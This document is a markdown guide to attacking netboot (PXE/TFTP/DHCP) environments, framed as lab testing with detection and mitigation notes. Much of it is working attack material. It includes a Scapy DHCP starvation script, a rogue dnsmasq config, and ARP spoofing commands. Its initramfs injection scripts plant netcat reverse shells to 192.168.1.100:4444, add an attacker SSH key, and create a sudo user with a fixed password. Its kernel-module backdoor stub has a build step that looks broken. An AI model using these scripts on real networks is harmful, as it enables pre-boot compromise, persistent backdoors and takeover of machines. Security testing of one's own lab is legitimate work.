# Netboot Architecture: Security Vulnerabilities, Attacks & Exploitation Guide

> A comprehensive report of vulnerabilities, attack vectors, and practical exploitation techniques feasible in your netboot lab environment. Each attack includes threat level, prerequisites, execution methods, detection techniques, and mitigation strategies.

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Attack Surface Overview](#attack-surface)
3. [Protocol-Level Attacks](#protocol-attacks)
4. [DHCP-Based Attacks](#dhcp-attacks)
5. [TFTP-Based Attacks](#tftp-attacks)
6. [Bootloader Attacks](#bootloader-attacks)
7. [Initramfs/Early Boot Attacks](#initramfs-attacks)
8. [Post-Boot Chain of Trust Attacks](#chain-of-trust-attacks)
9. [Security Verification Lab](#lab-testing)
10. [Mitigation Strategies](#mitigation)

---

## 1. Executive Summary

Your netboot architecture has **3 primary vulnerability domains**:

| Domain | Risk Level | Attack Type | Example |
|--------|-----------|------------|---------|
| **Network Layer (DHCP/TFTP)** | HIGH | Spoofing, MitM, Interception | Rogue DHCP, TFTP poisoning |
| **Boot Chain (Bootloader)** | CRITICAL | Unsigned code execution | pxelinux.0 substitution |
| **Early Userspace (Initramfs)** | CRITICAL | Unsigned injection | Init script manipulation |
| **Firmware/UEFI** | CRITICAL | Bootkit installation | Secure Boot bypass |

**Bottom Line**: Without signed boot chain + integrity verification at every step, an attacker on the network can **gain code execution before the OS kernel loads** with trivial effort.

---

## 2. Attack Surface Overview

```
Attack Entry Points (from easiest to hardest):

┌─────────────────────────────────────────────────────────────┐
│ 1. NETWORK LAYER (Unencrypted, Unauthenticated)             │
│    ├─ DHCP DISCOVER/OFFER/REQUEST/ACK (cleartext)          │
│    ├─ TFTP data transfer (plaintext)                        │
│    └─ Network broadcast (no authentication)                 │
│                                                              │
│ 2. TFTP SERVER (File delivery with NO security)             │
│    ├─ pxelinux.0 (unsigned binary)                          │
│    ├─ vmlinuz kernel (may or may not be signed)             │
│    ├─ initrd.img (initramfs, NOT signed by default)         │
│    └─ pxelinux.cfg/default (cleartext config)               │
│                                                              │
│ 3. BOOTLOADER (Limited validation)                          │
│    ├─ pxelinux.0: Trusts DHCP+TFTP implicitly              │
│    ├─ grubx64.efi: May validate kernel, but cfg often not  │
│    └─ No cryptographic verification of sources              │
│                                                              │
│ 4. INITRAMFS (Completely unsigned in most distros)          │
│    ├─ /init script (can inject shell, malware)              │
│    ├─ kernel modules (unsigned, can load backdoors)         │
│    └─ /bin binaries (no verification, can replace busybox)  │
│                                                              │
│ 5. FIRMWARE/UEFI (Complex, but Secure Boot can be bypassed) │
│    ├─ CVE-2025-3052: SB bypass via memory corruption        │
│    ├─ Black Lotus: Arbitrary code before OS                 │
│    └─ Shim vulnerabilities: PXE chain-loading flaws         │
│                                                              │
└─────────────────────────────────────────────────────────────┘

Success = Compromise ANY of these layers
```

---

## 3. Protocol-Level Attacks

### 3.1 ARP Spoofing / ARP Poisoning (Prerequisite for MitM)

**Threat Level**: ⚠️ MEDIUM (Enables higher-level attacks)

**What It Does**:
- Attacker sends fake ARP replies associating their MAC with gateway/TFTP server IP
- Redirects all traffic destined for that IP through attacker's machine
- Enables packet capture and manipulation

**Prerequisites**:
- Network access to same L2 segment (LAN)
- No ARP monitoring/security tools

**Execution (Kali Linux / Garuda)**:

```bash
# Tool: arpspoof (dsniff suite)
sudo apt-get install dsniff

# Scenario: Gateway is 192.168.1.1, TFTP is 192.168.1.10
# Attacker IP: 192.168.1.100

# Poison ARP tables on clients to intercept gateway traffic
sudo arpspoof -i eth0 -t 192.168.1.100-200 192.168.1.1

# In parallel: Poison the gateway's ARP table (so replies come back to attacker)
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100-200

# Alternative: Use Ettercap (GUI-based, easier)
sudo ettercap -G

# In Ettercap GUI:
# 1. Sniff → Unified Sniffing
# 2. Hosts → Scan for hosts
# 3. Select target range (e.g., 192.168.1.0/24)
# 4. Mitm → ARP Poisoning
# 5. Filters → Enable to inject/modify traffic

# Verify ARP poisoning is working:
arp -a  # On client, should show attacker MAC for gateway IP

# Capture traffic to verify
sudo tcpdump -i eth0 -w arp_poison.pcap "port 67 or port 69"
```

**Detection**:
```bash
# Watch for ARP entries changing frequently
arp -a | watch -n 1

# Monitor ARP traffic
sudo tcpdump -i eth0 -vv arp

# Use arpwatch tool
sudo arpwatch -i eth0 -f /var/lib/arpwatch/arp.dat

# Log suspicious entries
sudo ettercap -T -q -i eth0 -M arp:remote -P list_profiles \
    -L /tmp/ettercap.log
```

**Mitigation**:
- Static ARP entries for critical servers (DHCP, TFTP)
- ARP monitoring tools (arpwatch)
- Network segmentation via VLANs
- DHCP snooping on switches

---

### 3.2 DHCP Starvation Attack

**Threat Level**: ⚠️ MEDIUM-HIGH (DoS + enables rogue DHCP)

**What It Does**:
- Attacker sends hundreds of DHCP DISCOVER packets with spoofed MAC addresses
- Exhausts DHCP server's IP pool
- Legitimate clients cannot get IP addresses
- Paves way for attacker to run rogue DHCP server

**Prerequisites**:
- Network access to DHCP server
- No DHCP server protections (rate limiting, MAC binding)

**Execution (Lab)**:

```bash
# Tool 1: Yersinia (interactive)
sudo apt-get install yersinia
sudo yersinia -G
# GUI: Select DHCP → Sending DHCP requests → Launch

# Tool 2: Scapy (Python) - More control
cat > dhcp_starvation.py << 'EOF'
#!/usr/bin/env python3
from scapy.all import *
import random
import string

INTERFACE = "eth0"
DHCP_SERVER = "192.168.1.1"

def random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])

def dhcp_starvation(num_requests=100):
    for i in range(num_requests):
        mac = random_mac()
        print(f"[{i+1}/{num_requests}] Sending DHCPDISCOVER with MAC: {mac}")
        
        # Craft DHCP DISCOVER packet
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / \
              IP(src="0.0.0.0", dst="255.255.255.255") / \
              UDP(sport=68, dport=67) / \
              BOOTP(chaddr=mac) / \
              DHCP(options=[("message-type", "discover"), "end"])
        
        sendp(pkt, iface=INTERFACE, verbose=False)
        time.sleep(0.1)  # Small delay between packets

if __name__ == "__main__":
    dhcp_starvation(num_requests=200)
    print("\n[*] DHCP starvation complete. Check server logs for exhausted pool.")
EOF

sudo python3 dhcp_starvation.py

# Tool 3: dhcpstarv (simpler)
sudo apt-get install dhcpstarv
sudo dhcpstarv -i eth0
```

**Lab Test Steps**:

```bash
# 1. On your DHCP server, check available IPs
grep "lease" /var/lib/dhcp/dhcpd.leases

# 2. Run starvation attack on attacker machine
sudo python3 dhcp_starvation.py

# 3. Try to boot a client (it will fail to get IP)
# From client: dhclient eth0 (timeout or error)

# 4. Check server logs
tail -100 /var/log/syslog | grep DHCP

# Expected output:
# DHCPDISCOVER from aa:bb:cc:dd:ee:01 ...
# DHCPDISCOVER from aa:bb:cc:dd:ee:02 ...
# (hundreds of entries with different MACs)

# 5. View exhausted pool
show ip dhcp binding  # (on real ISC DHCP)
# or check /var/lib/dhcp/dhcpd.leases for all reserved IPs
```

**Detection**:
```bash
# Monitor DHCP requests in real-time
sudo tcpdump -i eth0 -vv "port 67 or port 68"

# Alert on high volume of unique MACs in short time
sudo tshark -i eth0 -Y dhcp -T fields -e dhcp.client_hw_addr | sort | uniq -c | sort -rn

# Server-side: Check for rapid pool exhaustion
tail -f /var/log/syslog | grep "DHCP"
```

---

## 4. DHCP-Based Attacks

### 4.1 Rogue DHCP Server (Prerequisite for MitM)

**Threat Level**: 🔴 CRITICAL

**What It Does**:
- Attacker runs fake DHCP server on network
- Responds to DHCP DISCOVER faster than legitimate server
- Provides malicious configuration:
  - `next-server` pointing to attacker's TFTP
  - `filename` pointing to malicious bootloader
  - DNS servers pointing to attacker (for DNS spoofing)
  - Default gateway = attacker (for traffic redirection)

**Prerequisites**:
- Network access
- Root/elevated privileges (to run DHCP server)
- (Optional) DHCP starvation to prevent legitimate server responses

**Execution (Lab)**:

```bash
# Tool: dnsmasq (lightweight, easier than ISC DHCP)
sudo apt-get install dnsmasq

cat > /tmp/rogue_dhcp.conf << 'EOF'
# ROGUE DHCP Configuration
interface=eth0
bind-interfaces

# DHCP pool
dhcp-range=192.168.1.100,192.168.1.200,12h

# PXE boot options (MALICIOUS)
dhcp-option=66,192.168.1.100          # next-server (TFTP)
dhcp-option=67,malicious_pxelinux.0   # filename

# DNS poisoning
dhcp-option=6,192.168.1.100            # DNS server (attacker)

# Default gateway (MitM)
dhcp-option=3,192.168.1.100            # router (attacker)
EOF

# Kill legitimate DHCP server first
sudo systemctl stop isc-dhcp-server 2>/dev/null

# Run rogue DHCP
sudo dnsmasq -C /tmp/rogue_dhcp.conf -d

# In another terminal, test:
sudo dhclient -v eth1  # From client
# You'll see DHCP OFFER from attacker's DHCP (rogue)
```

**Lab Test Steps**:

```bash
# 1. On attacker machine: Start rogue DHCP + TFTP server
# (Setup as above)

# 2. On client machine: Boot via PXE
# The client will:
#   a) Get IP from rogue DHCP (if it responds faster)
#   b) Connect to attacker's TFTP (next-server)
#   c) Download attacker's malicious bootloader (filename)
#   d) Load attacker's kernel/initrd
#   e) Compromise!

# 3. Verify:
sudo tcpdump -i eth0 "port 67 or port 68" -vv
# Look for DHCPOFFER from attacker's IP with malicious options

# 4. Check what bootloader was served:
tail -100 /tmp/tftp.log | grep malicious
```

**Detection**:
```bash
# Monitor DHCP responses from unexpected sources
sudo tcpdump -i eth0 -vv "port 67 or port 68" | grep DHCPOFFER

# Alert on multiple DHCP servers
# On legitimate server:
dhcp-failure-log="/var/log/dhcp-starvation.log"
sudo dmesg | grep "no free leases"

# Network segment protection: DHCP snooping
# (Configure on switch, not in Linux)
```

---

## 5. TFTP-Based Attacks

### 5.1 TFTP File Substitution / Poisoning

**Threat Level**: 🔴 CRITICAL

**What It Does**:
- Attacker intercepts TFTP requests (or runs own TFTP server)
- Substitutes bootloader, kernel, or initramfs with malicious versions
- Client downloads and executes compromised code

**Prerequisites**:
- Network access to client or ARP/DHCP poisoning
- Malicious bootloader/kernel/initramfs prepared
- TFTP server running (attacker-controlled or compromised legitimate one)

**Execution (Lab)**:

```bash
# Scenario 1: Compromise legitimate TFTP server
# (If you have access)

# Backup originals
cp /srv/tftp/pxelinux.0 /srv/tftp/pxelinux.0.orig
cp /srv/tftp/vmlinuz /srv/tftp/vmlinuz.orig

# Replace with malicious versions
# (See section 7.2 for how to create malicious initramfs)
cp /tmp/malicious_pxelinux.0 /srv/tftp/pxelinux.0
cp /tmp/malicious_vmlinuz /srv/tftp/vmlinuz
cp /tmp/malicious_initrd.img /srv/tftp/initrd.img

# Scenario 2: Run attacker-controlled TFTP server

mkdir -p /tmp/attacker_tftp
cat > /tmp/attacker_tftp/tftpd.sh << 'EOF'
#!/bin/bash
sudo in.tftpd -vvv -l -u tftp -s /tmp/attacker_tftp
EOF

chmod +x /tmp/attacker_tftp/tftpd.sh

# Copy malicious files
cp /tmp/malicious_* /tmp/attacker_tftp/

# Start TFTP server on attacker's IP (172.16.0.100)
sudo in.tftpd -vvv -l -u tftp -s /tmp/attacker_tftp

# On attacker: Run ARP spoofing to redirect TFTP traffic
sudo arpspoof -i eth0 -t 192.168.1.0/24 192.168.1.10
# (Redirect traffic destined for legitimate TFTP 192.168.1.10 to attacker)

# Client will:
# 1. Request bootloader via TFTP
# 2. ARP spoofing redirects to attacker
# 3. Client downloads malicious bootloader
# 4. Bootloader loads malicious initramfs
# 5. Compromise!
```

**Creating Malicious Initramfs** (See section 7.2 for full details):

```bash
# Extract legitimate initramfs
zcat /srv/tftp/initrd.img | cpio -idmv -D /tmp/initrd_extract/

# Modify init script to add backdoor
cat > /tmp/initrd_extract/init.patch << 'INIT_EOF'
#!/bin/sh
# Original init code...
mount -t proc proc /proc
# ...

# INJECTED CODE: Start reverse shell
(sleep 5; busybox nc -e /bin/sh 192.168.1.100 4444) &

# Continue with rest of init...
exec switch_root /mnt/root /sbin/init
INIT_EOF

cp /tmp/initrd_extract/init.patch /tmp/initrd_extract/init
chmod +x /tmp/initrd_extract/init

# Rebuild malicious initramfs
cd /tmp/initrd_extract
find . -print0 | cpio -0o -H newc -R 0:0 | gzip > /tmp/malicious_initrd.img

echo "Malicious initramfs created: /tmp/malicious_initrd.img"
```

**Lab Test**:

```bash
# 1. On attacker: Setup malicious TFTP + ARP spoofing
sudo arpspoof -i eth0 -t 192.168.1.0/24 192.168.1.10 &
sudo in.tftpd -vvv -l -u tftp -s /tmp/attacker_tftp

# 2. On client: Boot via PXE
# Client downloads from attacker's TFTP (via ARP redirect)
# Loads malicious initramfs → reverse shell to attacker

# 3. On attacker: Catch reverse shell
nc -l -p 4444
# You now have shell on booted client!
```

**Detection**:
```bash
# TFTP server logs
tail -f /tmp/tftp.log | grep "RRQ\|WRQ"

# Verify file integrity on server
md5sum /srv/tftp/{pxelinux.0,vmlinuz,initrd.img}
# Compare with known-good checksums

# Monitor ARP traffic for spoofing
sudo arpwatch -i eth0

# Packet capture
sudo tcpdump -i eth0 -vv "port 69" -w tftp.pcap
```

---

## 6. Bootloader Attacks

### 6.1 Unsigned Bootloader Substitution

**Threat Level**: 🔴 CRITICAL

**What It Does**:
- Replace legitimate `pxelinux.0` with attacker's version
- Attacker's bootloader loads attacker's kernel/initramfs
- Early code execution with no signature validation

**Prerequisites**:
- Control of TFTP server (via compromise or MitM)
- Ability to recompile syslinux (or use pre-compiled exploits)

**Execution**:

```bash
# Method 1: Simple replacement (fastest)
# Since pxelinux.0 is not signed, just swap it out

cp /srv/tftp/pxelinux.0 /srv/tftp/pxelinux.0.backup
# Replace with trojanized version (see below)

# Method 2: Trojanize pxelinux.0 (advanced)
# Syslinux source available at: https://github.com/gensym/Syslinux

git clone https://github.com/gensym/Syslinux.git
cd Syslinux

# Modify core bootloader code to inject backdoor
# Example: Edit core/pxelinux.asm to add shellcode
# (This is complex; simpler: modify the config instead)

# Method 3: Replace only the config (easier)
cat > /srv/tftp/pxelinux.cfg/default << 'EOF'
DEFAULT vesamenu.c32
TIMEOUT 5

LABEL attacker
  MENU LABEL My OS
  KERNEL /malicious_vmlinuz
  APPEND initrd=/malicious_initrd.img root=/dev/nfs nfsroot=192.168.1.100:/malicious ip=dhcp

LABEL original
  MENU LABEL Original (Hidden)
  KERNEL /vmlinuz.orig
  APPEND initrd=/initrd.orig.img ...
EOF

# Client boots attacker's kernel instead!
```

**Detection**:
```bash
# Check bootloader checksums
sha256sum /srv/tftp/pxelinux.0
# Compare with known-good value from syslinux package

# Monitor TFTP requests
sudo tcpdump -i eth0 "port 69" -A | grep -E "pxelinux|vmlinuz"

# Inspect pxelinux.0 strings
strings /srv/tftp/pxelinux.0 | grep -i "backdoor\|shellcode\|malware"
```

---

## 7. Initramfs/Early Boot Attacks

### 7.1 Initramfs Debug Shell Exploitation (CVE-2016-4484)

**Threat Level**: 🔴 CRITICAL (if enabled)

**What It Does**:
- Many Linux distributions include debug shells in initramfs
- Attacker with physical access OR network access can trigger shell
- Full system compromise before OS boots

**Prerequisites**:
- Kernel command line allows `break=` parameters (many distros)
- OR: physical access to edit boot parameters

**Execution**:

```bash
# In pxelinux.cfg/default, modify boot entry:
LABEL debug_shell
  KERNEL /vmlinuz
  APPEND initrd=/initrd.img root=/dev/nfs \
          break=init console=ttyS0

# OR: Use grub console to edit boot command:
# (Press 'e' at GRUB menu)
# Find the 'linux' line and add:
# break=init

# When kernel boots with break=init, initramfs drops to shell:
# # (you are now in initramfs as root!)

# From here, attacker can:
mount -t proc proc /proc
mount -t sysfs sysfs /sys

# Access and modify boot components
ls -la /bin
ls -la /lib/modules/

# Inject backdoor into init script
vi /init
# Add: (sleep 2; busybox nc -e /bin/sh attacker_ip 4444) &

# Exit shell (initramfs continues boot)
exit

# System boots with injected malware
```

**Lab Test**:

```bash
# 1. Edit pxelinux config to include break parameter:
cat >> /srv/tftp/pxelinux.cfg/default << 'EOF'

LABEL test_debug
  KERNEL /vmlinuz
  APPEND initrd=/initrd.img root=/dev/ram0 break=init console=ttyS0
EOF

# 2. Boot client with this label
# You'll drop to initramfs shell

# 3. Verify you can access init and modules:
cat /init
ls /lib/modules/

# 4. Modify init to add reverse shell:
echo "(sleep 5; nc -e /bin/sh 192.168.1.100 4444) &" >> /init

# 5. Type 'exit' to continue boot
exit

# 6. System now runs injected malware!
# On attacker: nc -l -p 4444  # (shell connects here)
```

**Detection**:
```bash
# Check if break parameters are allowed
cat /srv/tftp/pxelinux.cfg/default | grep -i "break"

# Monitor kernel command lines
cat /proc/cmdline | grep break

# Check for unauthorized modifications to initramfs
# Compare checksums
md5sum /boot/initrd* 
# Store known-good values and monitor for changes

# Monitor boot logs for "break" parameter
dmesg | grep "rd.break\|break=init"
```

### 7.2 Initramfs Injection Attack

**Threat Level**: 🔴 CRITICAL

**What It Does**:
- Extract legitimate initramfs
- Inject malicious code into init script or add backdoor binaries
- Repackage and serve as "legitimate" initramfs
- System boots with embedded malware

**Prerequisites**:
- Control of TFTP server
- Tools to extract/rebuild initramfs (gunzip, cpio, gzip)

**Execution**:

```bash
# Complete malicious initramfs creation

mkdir -p /tmp/initramfs_work/{extract,build}
cd /tmp/initramfs_work

# 1. Extract original initramfs
zcat /srv/tftp/initrd.img | cpio -idmv -D extract/

# 2. Create backdoor shell script
cat > extract/bin/backdoor.sh << 'BACKDOOR_EOF'
#!/bin/sh
# Persistent backdoor - executes on every boot

# Create SSH key if not present
[ -d /root/.ssh ] || mkdir -p /root/.ssh
echo "ATTACKER_SSH_PUBKEY" >> /root/.ssh/authorized_keys 2>/dev/null

# Create user for persistence
useradd -m -G sudo attacker 2>/dev/null
echo "attacker:password123" | chpasswd 2>/dev/null

# Start reverse shell to attacker
(sleep 10; busybox nc -e /bin/sh 192.168.1.100 4444) &

BACKDOOR_EOF

chmod +x extract/bin/backdoor.sh

# 3. Inject backdoor call into init script
# Find where init mounts root filesystem and add our script call BEFORE it

cat > /tmp/inject_patch.sh << 'PATCH_EOF'
#!/bin/bash

INIT_FILE="extract/init"

# Add backdoor call after mounts, before pivot_root
sed -i '/exec switch_root/i /bin/backdoor.sh' "$INIT_FILE"

echo "[+] Injected backdoor into init script"
PATCH_EOF

bash /tmp/inject_patch.sh

# Verify injection
grep -n "backdoor" extract/init

# 4. Rebuild malicious initramfs
cd extract
find . -print0 | cpio -0o -H newc -R 0:0 | gzip > ../malicious_initrd.img

# 5. Replace original (if you have server access)
cp ../malicious_initrd.img /srv/tftp/initrd.img

# 6. Test
echo "[+] Malicious initramfs ready: /tmp/initramfs_work/malicious_initrd.img"

# On client: When it boots, it will execute /bin/backdoor.sh
# Result: SSH key added + reverse shell established!
```

**Advanced Injection: Module-Level Backdoor**:

```bash
# Insert malicious kernel module into initramfs

# Create simple kernel module that starts backdoor
cat > /tmp/backdoor_module.c << 'MODULE_EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

static int __init backdoor_init(void) {
    // Start reverse shell
    // (In real code: execute shell command via system() call)
    printk(KERN_INFO "Backdoor module loaded\n");
    return 0;
}

module_init(backdoor_init);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Attacker");
EOF

# Compile (requires kernel headers, GCC)
gcc -c -D__KERNEL__ -I/usr/src/linux-headers-$(uname -r)/include \
    /tmp/backdoor_module.c -o backdoor.ko

# Add to initramfs
cp backdoor.ko extract/lib/modules/$(uname -r)/

# Modify init to load it:
echo "insmod /lib/modules/\$(uname -r)/backdoor.ko" >> extract/init

# Rebuild as above
```

**Lab Test**:

```bash
# 1. Create malicious initramfs as above
bash /tmp/initramfs_create_malicious.sh

# 2. Copy to TFTP
cp /tmp/initramfs_work/malicious_initrd.img /srv/tftp/initrd-malicious.img

# 3. Add to boot config
cat >> /srv/tftp/pxelinux.cfg/default << 'EOF'

LABEL pwned
  KERNEL /vmlinuz
  APPEND initrd=/initrd-malicious.img root=/dev/ram0 console=ttyS0
EOF

# 4. Boot client with malicious label
# Client boots → initramfs runs → backdoor shell connects to attacker

# 5. On attacker: Listen for shell
nc -l -p 4444

# 6. On booted client: Shell connects, you have root!
```

**Detection**:
```bash
# Compare initramfs checksums
sha256sum /srv/tftp/initrd.img 
# Alert if different from known-good value

# Extract and inspect suspicious initramfs
zcat /srv/tftp/initrd.img | cpio -t | grep -i "backdoor\|malicious"

# Monitor for unauthorized init modifications
# Periodically audit init script
md5sum /boot/*init* | tee /tmp/init_checksums.txt
# Compare with previous runs

# Monitor initramfs extraction in logs
journalctl -xe | grep initramfs
```

---

## 8. Post-Boot Chain of Trust Attacks

### 8.1 Secure Boot Bypass Attacks

**Threat Level**: 🔴 CRITICAL (if Secure Boot enabled)

**Relevant CVEs**:
- **CVE-2025-3052**: Memory corruption in signed UEFI module → arbitrary code execution
- **CVE-2023-40547**: Shim bootloader vulnerability → Secure Boot bypass
- **Black Lotus**: UEFI bootkit → bypasses Secure Boot via code execution

**What It Does**:
- Exploits flaws in firmware or signed bootloaders
- Executes attacker code before OS, with Secure Boot still appearing enabled
- Can install persistent firmware rootkit

**Execution (Theoretical - requires firmware vulnerability)**:

```bash
# CVE-2025-3052 PoC concept (simplified):
# 1. Create malicious UEFI module that exploits memory corruption
# 2. Register via Boot Manager
# 3. On reboot, firmware loads module
# 4. Module overwrites gSecurityProtocol variable → disables SB
# 5. Load second unsigned module with actual payload
# 6. Attacker code runs pre-OS

# Lab test (if you have test firmware):
# Download vulnerable UEFI binary
# Use UEFI simulator to test exploit chain

# Or: Use existing PoC
git clone https://github.com/torvalds/linux.git  # (just for reference)
# Actual PoC's are restricted/not public
```

**Detection**:

```bash
# Check Secure Boot status (from running OS)
mokutil --sb-state

# Monitor UEFI variables for unauthorized changes
efivar -l | grep SecureBoot
efivar -d -n 8be4df61-93ca-11d2-aa0d-00e098032b8c-SecureBoot

# Check for firmware modifications
# (Requires specialized tools like Chipsec)
sudo chipsec_main.py -m tools.uefi.uefivar

# Monitor for suspiciously early execution
# Boot with serial console and check for unusual messages
```

### 8.2 Shim Bootloader Chain-Load Attack (CVE-2023-40547)

**Threat Level**: 🔴 CRITICAL

**What It Does**:
- Attacker on network performs PXE chain-loading
- Loads malicious shim instead of legitimate one
- Shim appears signed (so Secure Boot allows it)
- Malicious shim loads attacker's GRUB
- Full compromise before OS

**Prerequisites**:
- Network access
- Vulnerable shim version
- Ability to serve malicious shim via TFTP

**Execution**:

```bash
# Check shim version on system
dpkg -l | grep shim

# Download vulnerable shim (if available)
# (CVE-2023-40547 affected shim < 15.7-1 / < 15.8)

# Create TFTP entry for malicious shim
mkdir -p /srv/tftp/EFI/BOOT/
cp /tmp/vulnerable_shimx64.efi /srv/tftp/EFI/BOOT/shimx64.efi

# Modified GRUB config to load attacker's kernel
cat > /srv/tftp/EFI/BOOT/grub.cfg << 'EOF'
menuentry "Compromised OS" {
    linux /malicious_vmlinuz root=/dev/nfs ip=dhcp ...
    initrd /malicious_initrd.img
}
EOF

# When UEFI client PXE boots:
# 1. Firmware loads shimx64.efi (from TFTP, attacker-controlled)
# 2. Shim loads grub.cfg (also attacker-controlled)
# 3. GRUB loads malicious kernel + initrd
# 4. System compromised

# Note: This requires vulnerable shim; modern shims have fixes
```

**Detection**:

```bash
# Check for unauthorized UEFI binaries in TFTP
ls -la /srv/tftp/EFI/BOOT/

# Verify shim signatures (if tools available)
pesign -l -f /srv/tftp/EFI/BOOT/shimx64.efi

# Monitor TFTP for EFI file requests
sudo tcpdump -i eth0 "port 69" -A | grep -i "\.efi\|shimx64"

# On booted system: Check which shim is running
cat /proc/cmdline | grep -i "shim"
mokutil --list-enrolled
```

---

## 9. Security Verification Lab

### 9.1 Lab Setup & Attack Scenarios

**Lab Architecture**:

```
┌─────────────────────────────────────────────────────────────┐
│ ATTACKER MACHINE (your pentesting box)                      │
│  ├─ Rogue DHCP server (dnsmasq)                             │
│  ├─ Malicious TFTP server (in.tftpd)                        │
│  ├─ ARP spoofing tools (arpspoof, ettercap)                 │
│  ├─ Initramfs modification tools                            │
│  └─ Listener for reverse shells (nc)                        │
│                                                              │
├─────────────────────────────────────────────────────────────┤
│ NETWORK SEGMENT (Attacker + Legitimate Servers + Clients)   │
│  ├─ Legitimate DHCP/TFTP server (your original setup)       │
│  ├─ QEMU/VirtualBox clients (boot targets)                  │
│  └─ Network interfaces: eth0 (attacker), eth1 (clients)     │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**Comprehensive Lab Test Script**:

```bash
#!/bin/bash
# netboot_security_lab_test.sh

set -e

ATTACKER_IP="192.168.1.100"
LEGIT_DHCP_IP="192.168.1.10"
LEGIT_TFTP_IP="192.168.1.10"
SUBNET="192.168.1.0/24"
IFACE="eth0"

RESULTS_FILE="/tmp/netboot_lab_results.txt"

echo "=== Netboot Security Lab Test ===" | tee "$RESULTS_FILE"
echo "Date: $(date)" | tee -a "$RESULTS_FILE"
echo "" | tee -a "$RESULTS_FILE"

# Test 1: DHCP Starvation
test_dhcp_starvation() {
    echo "[TEST 1] DHCP Starvation Attack" | tee -a "$RESULTS_FILE"
    
    # Count current DHCP leases
    BEFORE=$(grep "^lease" /var/lib/dhcp/dhcpd.leases | wc -l)
    
    # Run starvation
    python3 /tmp/dhcp_starvation.py
    
    # Count after
    sleep 5
    AFTER=$(grep "^lease" /var/lib/dhcp/dhcpd.leases | wc -l)
    
    echo "  Before: $BEFORE leases" | tee -a "$RESULTS_FILE"
    echo "  After: $AFTER leases" | tee -a "$RESULTS_FILE"
    
    if [ $AFTER -gt $BEFORE ]; then
        echo "  ✓ VULNERABLE: DHCP pool exhausted" | tee -a "$RESULTS_FILE"
    else
        echo "  ✗ PROTECTED: DHCP pool resilient" | tee -a "$RESULTS_FILE"
    fi
    echo "" | tee -a "$RESULTS_FILE"
}

# Test 2: Rogue DHCP Server
test_rogue_dhcp() {
    echo "[TEST 2] Rogue DHCP Server Response" | tee -a "$RESULTS_FILE"
    
    # Start rogue DHCP in background
    sudo dnsmasq -C /tmp/rogue_dhcp.conf -d > /tmp/rogue_dhcp.log 2>&1 &
    ROGUE_PID=$!
    sleep 2
    
    # Send DHCP request from client
    sudo timeout 5 dhclient -v eth1 2>&1 | tee /tmp/dhclient.log
    
    # Check if rogue DHCP responded
    if grep -q "DHCPOFFER" /tmp/dhclient.log; then
        echo "  ✓ VULNERABLE: Rogue DHCP accepted" | tee -a "$RESULTS_FILE"
    else
        echo "  ✗ PROTECTED: Rogue DHCP blocked" | tee -a "$RESULTS_FILE"
    fi
    
    kill $ROGUE_PID 2>/dev/null || true
    echo "" | tee -a "$RESULTS_FILE"
}

# Test 3: Unsigned Bootloader Check
test_bootloader_signatures() {
    echo "[TEST 3] Bootloader Signature Verification" | tee -a "$RESULTS_FILE"
    
    # Check if pxelinux.0 is signed (usually not)
    if file /srv/tftp/pxelinux.0 | grep -q "PE32"; then
        echo "  File: pxelinux.0 (PE binary)" | tee -a "$RESULTS_FILE"
    else
        echo "  File: pxelinux.0 (Unknown format)" | tee -a "$RESULTS_FILE"
    fi
    
    # Try to verify signature (will fail)
    if pesign -l -f /srv/tftp/pxelinux.0 &>/dev/null; then
        echo "  ✓ PROTECTED: pxelinux.0 is signed" | tee -a "$RESULTS_FILE"
    else
        echo "  ✗ VULNERABLE: pxelinux.0 is NOT signed" | tee -a "$RESULTS_FILE"
    fi
    
    # Check GRUB EFI
    if pesign -l -f /srv/tftp/EFI/BOOT/grubx64.efi &>/dev/null; then
        echo "  ✓ PROTECTED: grubx64.efi is signed" | tee -a "$RESULTS_FILE"
    else
        echo "  ✗ VULNERABLE: grubx64.efi is NOT signed" | tee -a "$RESULTS_FILE"
    fi
    echo "" | tee -a "$RESULTS_FILE"
}

# Test 4: Initramfs Signature Check
test_initramfs_signatures() {
    echo "[TEST 4] Initramfs Integrity Verification" | tee -a "$RESULTS_FILE"
    
    # Check if initramfs is signed (usually not)
    file /srv/tftp/initrd.img | tee -a "$RESULTS_FILE"
    
    # Calculate checksum
    SHA256=$(sha256sum /srv/tftp/initrd.img | awk '{print $1}')
    echo "  SHA256: $SHA256" | tee -a "$RESULTS_FILE"
    
    echo "  ✗ VULNERABLE: Initramfs is typically NOT signed" | tee -a "$RESULTS_FILE"
    echo "    (Attacker can substitute with malicious version)" | tee -a "$RESULTS_FILE"
    echo "" | tee -a "$RESULTS_FILE"
}

# Test 5: Debug Shell Availability
test_debug_shell() {
    echo "[TEST 5] Early Boot Debug Shell" | tee -a "$RESULTS_FILE"
    
    # Check if break parameter is in config
    if grep -q "break=" /srv/tftp/pxelinux.cfg/default; then
        echo "  ✗ VULNERABLE: Debug shell enabled in boot config" | tee -a "$RESULTS_FILE"
    else
        echo "  ✓ INFO: Debug shell not in default config" | tee -a "$RESULTS_FILE"
    fi
    
    # Check kernel support
    if grep -q "rd.break\|break=" /boot/cmdline 2>/dev/null; then
        echo "  ✗ WARNING: System supports early break to shell" | tee -a "$RESULTS_FILE"
    fi
    echo "" | tee -a "$RESULTS_FILE"
}

# Test 6: TFTP File Integrity
test_tftp_integrity() {
    echo "[TEST 6] TFTP Server File Integrity" | tee -a "$RESULTS_FILE"
    
    # Check file permissions
    ls -la /srv/tftp/*.0 /srv/tftp/vmlinuz* /srv/tftp/initrd* | tee -a "$RESULTS_FILE"
    
    # Alert if world-writable
    if ls -la /srv/tftp/pxelinux.0 | grep -q "rw-rw-rw-\|rw-.*rw-"; then
        echo "  ✗ VULNERABLE: Files are world-writable!" | tee -a "$RESULTS_FILE"
    else
        echo "  ✓ PROTECTED: Files have restricted permissions" | tee -a "$RESULTS_FILE"
    fi
    echo "" | tee -a "$RESULTS_FILE"
}

# Run all tests
test_dhcp_starvation
test_rogue_dhcp
test_bootloader_signatures
test_initramfs_signatures
test_debug_shell
test_tftp_integrity

# Summary
echo "=== Test Complete ===" | tee -a "$RESULTS_FILE"
echo "Results saved to: $RESULTS_FILE" | tee -a "$RESULTS_FILE"
